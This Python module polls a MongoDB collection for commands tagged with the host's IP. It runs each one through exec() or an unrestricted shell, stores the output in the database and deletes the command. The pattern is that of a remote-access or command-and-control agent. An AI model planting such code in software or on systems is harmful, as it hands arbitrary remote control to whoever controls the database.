from os import chdir
from subprocess import PIPE, Popen
from io import StringIO
import sys
from pymongo import ASCENDING

from database.index import get_commands_collection, get_results_collection
from utils.get_ip import get_ip_util

def exec_commands():
    """
    Get the commands from the database.
    """
    commands = get_commands_collection().find({'ip': get_ip_util()}).sort('created_at', ASCENDING)

    for command in commands:
        try:
            if not command['realtime']:
                old_stdout = sys.stdout
                redirected_output = sys.stdout = StringIO()
                exec(command['commands'])
                final_result = redirected_output.getvalue()
                sys.stdout = old_stdout
            else:
                if(command['commands'].startswith('cd')):
                    chdir(command['commands'].split(' ')[1])
                    
                final_result = Popen(command['commands'], stdout=PIPE, shell=True, encoding='utf-8').stdout.read()

            get_results_collection().insert_one({'ip': get_ip_util(), 'results': final_result, 'command': command['commands']})
            get_commands_collection().delete_one({'_id': command['_id']})

        except Exception as e:
            print(e)
            pass

        